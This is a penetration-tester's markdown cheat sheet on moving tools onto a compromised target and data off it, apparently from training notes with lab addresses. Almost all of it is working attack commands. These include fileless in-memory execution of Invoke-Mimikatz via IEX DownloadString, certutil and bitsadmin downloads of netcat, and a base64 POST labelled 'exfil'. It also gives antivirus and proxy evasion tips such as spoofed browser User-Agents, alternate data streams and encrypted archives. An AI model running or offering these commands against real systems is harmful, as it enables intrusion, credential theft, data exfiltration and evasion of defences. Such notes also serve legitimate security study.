# File Transfers

> Status: ✅ Complete
> Date started: 2026-10-26
> Date finished: 2026-10-26

## 1. Goal
Move tools onto a target and loot off it, using whatever's available (and sometimes evading detection).

## Windows (download / exec / upload)
```powershell
Invoke-WebRequest http://<ip>/tool.ps1 -OutFile tool.ps1
IEX (New-Object Net.WebClient).DownloadString('http://<ip>/x.ps1')   # run in memory, no disk
Invoke-WebRequest -Uri http://<ip>/upload -Method POST -Body $b64    # exfil (base64 the file first)
# native LOLBins:
certutil.exe -urlcache -split -f http://<ip>/nc.exe nc.exe
certutil.exe -verifyctl -split -f http://<ip>/nc.exe        # alternate certutil download
bitsadmin /transfer j http://<ip>/nc.exe C:\Temp\nc.exe
# blend in with a real browser UA (AV/proxy evasion):
Invoke-WebRequest http://<ip>/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile nc.exe
```

## Linux
```bash
wget http://<ip>/linpeas.sh -O /tmp/x.sh ; curl http://<ip>/x.sh -o /tmp/x.sh
python3 -c "import urllib.request;urllib.request.urlretrieve('http://<ip>/f','f')"
php -r 'file_put_contents("f",file_get_contents("http://<ip>/f"));'
```

## Protocol-based (both)
```bash
scp user@<ip>:/tmp/file .            # download over SSH
scp ./file user@<ip>:/tmp/file       # upload over SSH
nc -lvnp 4444 > out ; nc <ip> 4444 < file    # netcat
smbclient //<ip>/share -U user       # then get/put  (impacket smbserver.py to host)
tftp -i <ip> GET nc.exe
```
Host a quick server: `python3 -m http.server 80` / `impacket-smbserver share .` / `php -S 0.0.0.0:80`.

## Evasion tips
Alternate ports, legit User-Agents, base64/`certutil -encode`, compress+encrypt (`7z a -p -mhe`), Windows alternate data streams (`type nc.exe > f.txt:nc.exe`).

> `python3 -m http.server` on your box + `wget`/`certutil`/IWR on the target covers 90% of transfers. `IEX (...).DownloadString` is the fileless favorite — runs in memory, nothing hits disk for AV to scan.

## Full command reference (source notes)
Complete transfer command set — nothing trimmed.

| Command | Description |
|---|---|
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')` | Execute a file in memory (PowerShell, fileless) |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell (base64 body) |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Download via Bitsadmin |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download via Certutil |
| `certutil.exe -urlcache -split -f http://<ip>/nc.exe nc.exe` | Download via Certutil (urlcache variant) |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download with Wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download with cURL |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download with PHP |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file via SCP |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file via SCP |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | IWR with a Chrome User-Agent (evasion) |

Host a quick server to pull from: `python3 -m http.server 80` · `impacket-smbserver share .` · `php -S 0.0.0.0:80`.
